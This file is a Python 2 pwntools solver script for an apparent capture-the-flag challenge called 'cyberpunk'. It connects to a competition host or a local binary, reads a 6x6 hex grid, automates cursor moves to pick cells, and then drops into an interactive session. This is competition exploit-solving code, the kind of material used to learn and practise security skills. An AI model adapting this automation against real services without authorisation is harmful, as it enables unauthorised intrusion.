#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "cyberpunk.sstf.site"
PORT = 31477
PROCESS = "./cyberpunk"

charset = "ABCDEF0123456789"
values = []
curX = 0
curY = 0

def parse_values():
	r.recvuntil("]\n")

	for i in range(6*6):
		ch = r.recv(1)
	
		while ch not in charset:
			ch = r.recv(1)

		V1 = ch + r.recv(1)

		values.append(int("0x"+V1, 16))

def go_down():
	global curX, curY

	curY += 1
	r.sendline("s")
	print r.recvuntil("$> ")

	curY = curY % 6
	curX = curX % 6

def go_right():
	global curX, curY

	curX += 1
	r.sendline("d")
	print r.recvuntil("$> ")

	curY = curY % 6
	curX = curX % 6

def select_cell():
	global curX, curY
	r.sendline(" ")	

	curY = curY % 6
	curX = curX % 6

	values[curY*6+curX] = -1

def exploit(r):
	global curX, curY

	r.recvuntil("break in\n")
	r.sendline("")

	parse_values()
	r.recvuntil("> ")

	# find line which contains 0x5a and 0xXB
	found = False

	for x in range(6):
		found5a = [-1, -1]
		foundXb = [-1, -1]
		
		for y in range(6):
			if values[y*6 + x] == 0x5a:
				found5a = [x, y]
			elif (values[y*6 + x] & 0xf) == 0xb:
				foundXb = [x, y]

		if found5a[1] != -1 and foundXb[1] != -1:
			log.info("Found good line")
			found = True
			break

	print found5a
	print foundXb

	if not found:
		exit()

	# play 16 bytes and end up in line of found values
	curX = 0
	curY = 0
	direction = 2  					# 1 = down 2 = right

	for i in range(16):
		select_cell()

		if direction == 2:			
			go_down()

			while values[curY*6+curX] == -1:
				go_down()
			
			direction = 1
		elif direction == 1:
			go_right()

			while (values[curY*6+curX] == -1) or (curX == found5a[0]):
				go_right()

			direction = 2

	# now just manually select 0x5a and 0xXB 
	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./cyberpunk")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./cyberpunk")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)